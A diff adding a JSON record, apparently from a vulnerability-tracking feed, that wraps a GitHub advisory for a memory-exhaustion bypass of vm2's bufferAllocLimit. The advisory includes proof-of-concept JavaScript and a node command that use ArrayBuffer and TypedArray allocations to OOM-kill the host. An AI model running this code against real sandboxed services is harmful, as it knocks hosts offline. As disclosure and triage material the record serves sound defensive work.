@@ -1,0 +1,56 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/85845881?v=4\", \"events_url\": \"https://api.github.com/users/Kr1shna4garwal/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Kr1shna4garwal/followers\", \"following_url\": \"https://api.github.com/users/Kr1shna4garwal/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Kr1shna4garwal/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Kr1shna4garwal\", \"id\": 85845881, \"login\": \"Kr1shna4garwal\", \"node_id\": \"MDQ6VXNlcjg1ODQ1ODgx\", \"organizations_url\": \"https://api.github.com/users/Kr1shna4garwal/orgs\", \"received_events_url\": \"https://api.github.com/users/Kr1shna4garwal/received_events\", \"repos_url\": \"https://api.github.com/users/Kr1shna4garwal/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Kr1shna4garwal/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Kr1shna4garwal/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Kr1shna4garwal\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary:\\n\\nThe `bufferAllocLimit` defense (GHSA-6785-pvv7-mvg7) can be completely bypassed using `ArrayBuffer`, `SharedArrayBuffer`, or any `TypedArray` constructor. These allocate identical host-process RSS through the same V8/libuv C++ allocation path as `Buffer.alloc` but are not subject to the size cap.\\n\\n### Details:\\n\\nThe `bufferAllocLimit` option (vm2 v3.11.0+) caps `Buffer.alloc`, `Buffer.allocUnsafe`, `Buffer.allocUnsafeSlow`, and the deprecated `Buffer(N)` / `new Buffer(N)` forms. The cap is enforced in `setup-sandbox.js` via `checkBufferAllocLimit()` (line 353-359).\\n\\nHowever, `ArrayBuffer`, `SharedArrayBuffer`, `Uint8Array`, `Float64Array`, and all other TypedArray constructors are sandbox-realm V8 intrinsics that allocate host memory through the SAME underlying C++ path (`v8::ArrayBuffer::NewBackingStore` → `ArrayBufferAllocator::Allocate` → `calloc/malloc`). These constructors are NOT intercepted by the `bufferAllocLimit` defense.\\n\\nA single `new ArrayBuffer(N)` call with a large `N` exhausts host RSS in one synchronous allocation that V8's `timeout` cannot interrupt.\\n\\n### Environment:\\n\\n- vm2 version: 3.11.3\\n- Node.js: v25.8.1 (affects all Node.js versions)\\n- Configuration: Default `new VM()` or any configuration including `bufferAllocLimit`\\n\\n### POC:\\n\\n```javascript\\nconst { VM } = require('vm2');\\n\\n// Operator sets bufferAllocLimit thinking they're protected:\\nconst vm = new VM({ bufferAllocLimit: 10 * 1024 * 1024 }); // 10MB cap\\n\\n// Buffer.alloc IS capped (as intended):\\ntry { vm.run('Buffer.alloc(20 * 1024 * 1024)'); }\\ncatch(e) { console.log('Buffer.alloc blocked:', e.message); }\\n// → \\\"Buffer allocation size 20971520 exceeds bufferAllocLimit 10485760\\\"\\n\\n// But these BYPASS the cap entirely:\\nvm.run('new ArrayBuffer(1024 * 1024 * 1024)');        // 1GB allocated!\\nvm.run('new SharedArrayBuffer(1024 * 1024 * 1024)');  // 1GB allocated!\\nvm.run('new Uint8Array(1024 * 1024 * 1024)');         // 1GB allocated!\\nvm.run('new Float64Array(128 * 1024 * 1024)');        // 1GB allocated!\\n\\n// OOM kill in constrained environments (Docker, K8s, Lambda):\\nvm.run('var a=[]; for(var i=0;i<100;i++) a.push(new ArrayBuffer(100*1024*1024))');\\n// → 10GB allocated → host OOM killed\\n```\\n\\n**Verification:**\\n\\n```bash\\nnode -e '\\nconst {VM} = require(\\\"./lib/main.js\\\");\\nconst vm = new VM({bufferAllocLimit: 10*1024*1024});\\ntry { vm.run(\\\"Buffer.alloc(20*1024*1024)\\\"); } catch(e) { console.log(\\\"Buffer BLOCKED\\\"); }\\nconsole.log(\\\"ArrayBuffer:\\\", vm.run(\\\"new ArrayBuffer(100*1024*1024).byteLength\\\"), \\\"bytes allocated\\\");\\nconsole.log(\\\"SharedArrayBuffer:\\\", vm.run(\\\"new SharedArrayBuffer(100*1024*1024).byteLength\\\"), \\\"bytes allocated\\\");\\n'\\n# Output:\\n# Buffer BLOCKED\\n# ArrayBuffer: 104857600 bytes allocated\\n# SharedArrayBuffer: 104857600 bytes allocated\\n```\\n\\n### Impact:\\n\\n- **Type:** Denial of Service (Host Memory Exhaustion)\\n- **Attack Complexity:** Low\\n- **Availability Impact:** Complete, host process OOM killed in memory-constrained environments\\n- **Affected deployments:** Docker containers, Kubernetes pods, AWS Lambda, any environment with memory limits. Especially dangerous when operators explicitly set `bufferAllocLimit` believing they have DoS protection.\", \"ghsa_id\": \"GHSA-v836-6xw4-9cx3\", \"github_reviewed_at\": \"2026-08-17T17:32:57Z\", \"html_url\": \"https://github.com/advisories/GHSA-v836-6xw4-9cx3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-v836-6xw4-9cx3\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-17T17:32:57Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-v836-6xw4-9cx3\", \"https://github.com/patriksimek/vm2/releases/tag/3.11.6\", \"https://github.com/advisories/GHSA-v836-6xw4-9cx3\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-v836-6xw4-9cx3\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"vm2 has Memory Exhaustion DoS via bufferAllocLimit Bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-17T17:32:58Z\", \"url\": \"https://api.github.com/advisories/GHSA-v836-6xw4-9cx3\", \"vulnerabilities\": [{\"first_patched_version\": \"3.11.6\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.11.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-v836-6xw4-9cx3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.11.5"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-17T19:17:27.168804Z",
+  "provenance": {
+    "content_sha256": "e9eb6871a86fa73aaf5a3c481ffb59bedab16af4ef04402f111fa38af1520a05",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-17T17:32:57Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-v836-6xw4-9cx3",
+  "status": "active",
+  "title": "vm2 has Memory Exhaustion DoS via bufferAllocLimit Bypass",
+  "updated_at": "2026-08-17T17:32:58Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-v836-6xw4-9cx3"
+}
